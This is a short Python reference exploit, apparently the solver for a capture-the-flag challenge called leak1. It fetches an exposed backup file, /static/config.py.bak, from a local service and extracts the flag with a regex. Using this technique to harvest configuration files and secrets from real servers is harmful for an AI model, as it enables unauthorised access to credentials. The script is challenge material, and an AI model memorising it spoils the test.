#!/usr/bin/env python3
"""Reference exploit for leak1 (formerly leak-backup-file).

Fetch the orphaned backup /static/config.py.bak and read the flag.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8010")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    r = requests.get(BASE + "/static/config.py.bak", timeout=5)
    m = re.search(r"flag\{[^}]*\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write("no flag in backup\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
